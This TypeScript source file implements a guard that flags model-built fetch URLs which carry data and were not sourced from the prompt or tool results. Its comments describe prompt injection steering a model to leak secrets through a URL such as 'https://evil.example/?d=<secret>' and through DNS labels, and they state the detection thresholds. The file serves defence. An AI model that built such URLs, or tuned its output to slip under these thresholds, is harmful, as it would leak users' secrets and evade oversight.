import type { Message } from '../types.js';
import { extractUrls } from './_urls.js';

// Exfiltration guard for model-driven fetches (#548). The host policy (#544) keeps a fetch off this
// machine's network; what it cannot see is data leaving IN the URL — a model steered by injected
// text building `https://evil.example/?d=<secret>`. A blanket fetch approval was rejected (#164:
// it fires on every docs page, trains reflexive approving, small models spiral on declines), so
// the prompt fires only on the leak's shape, which takes two facts together:
//
// 1. PROVENANCE — the URL appears nowhere the model was handed it. A link lifted from a search
//    result, a fetched page, a file or the user's prompt is sourced; an attacker page can plant
//    `https://evil.example/?d=`, but the model appending data makes a URL that page never wrote.
// 2. PAYLOAD — it carries something: a long query value, many parameters, or a token-shaped path
//    segment or host label (the last is DNS exfiltration, which needs no response at all).
//
// A docs URL recalled from memory has no source but carries nothing, so it passes; that is the
// case a blanket prompt would have spent its credibility on.

// Query values at or past this length read as data rather than a switch (`?page=2`, `?lang=en`).
// Secrets and encoded blobs are longer; a model chunking one into short values pays a fetch per
// chunk against the per-turn budget.
const QUERY_VALUE_MIN_CHARS = 12;
const QUERY_MAX_PARAMS = 4;
// A segment or label this long, made only of token characters and holding a digit, is a key, a
// hash or an encoding. Hyphenated lowercase words (a slug, a UUID) are exempt — they are how pages
// are named, and a UUID is an identifier the site issued, not something the model encoded. The
// chunk bound is what keeps a hyphenated key (`sk-live-<16 hex>`) from passing as a slug.
const TOKEN_MIN_CHARS = 20;
const TOKEN_CHARS = /^[A-Za-z0-9_\-+=%.~]+$/;
const SLUG = /^[a-z0-9]{1,14}(-[a-z0-9]{1,14})+$/;

function isTokenShaped(s: string): boolean {
  return s.length >= TOKEN_MIN_CHARS && TOKEN_CHARS.test(s) && /\d/.test(s) && !SLUG.test(s);
}

// Why this URL looks like it carries data, or undefined when it does not. The reason is user-facing
// (it rides the approval warning), so it names the part of the URL that tripped it.
export function urlCarriesData(url: string): string | undefined {
  let u: URL;
  try {
    u = new URL(url);
  } catch {
    return undefined;
  }
  const params = [...u.searchParams];
  if (params.length >= QUERY_MAX_PARAMS) return `${params.length} query parameters`;
  const long = params.find(([, v]) => v.length >= QUERY_VALUE_MIN_CHARS);
  if (long) return `query value "${long[0]}" is ${long[1].length} chars`;
  const segment = u.pathname.split('/').find(s => isTokenShaped(decodeSafe(s)));
  if (segment) return 'a token-shaped path segment';
  const label = u.hostname.split('.').find(isTokenShaped);
  if (label) return 'a token-shaped host name label';
  return undefined;
}

function decodeSafe(s: string): string {
  try {
    return decodeURIComponent(s);
  } catch {
    return s;
  }
}

// Every URL the model was handed: user messages (a pasted URL's `<url>` block included) and tool
// results. The model's own text is excluded on purpose — a URL it wrote is the thing being judged.
// Rebuilt from the history on each check rather than accumulated, so a resumed session and a
// compaction fold need no bookkeeping: what the history holds is what the model can have copied.
export function collectSourcedUrls(history: readonly Message[]): Set<string> {
  const urls = new Set<string>();
  const add = (text: string | undefined) => {
    if (!text) return;
    for (const url of extractUrls(text)) urls.add(normalize(url));
  };
  for (const m of history) {
    if (m.role === 'user' && !m.meta) add(m.content);
    else if (m.role === 'tool') {
      add(m.summary);
      add(m.payload);
    }
  }
  return urls;
}

// The URL parser's canonical form, so `HTTPS://Example.com/a` and `https://example.com/a` match. An
// unparseable URL is compared as written.
function normalize(url: string): string {
  try {
    return new URL(url).href;
  } catch {
    return url;
  }
}

// The verdict the fetch tool acts on: a reason to confirm, or undefined to proceed. `sourced`
// undefined means provenance is unknown (a caller outside the loop), which counts as unsourced —
// the safe reading for a check whose miss is a leak.
export function exfiltrationRisk(
  url: string,
  sourced: ReadonlySet<string> | undefined,
): string | undefined {
  const payload = urlCarriesData(url);
  if (!payload) return undefined;
  if (sourced?.has(normalize(url))) return undefined;
  return `${payload}, and the URL is not a link from your prompt or any tool result — it may be sending data out`;
}
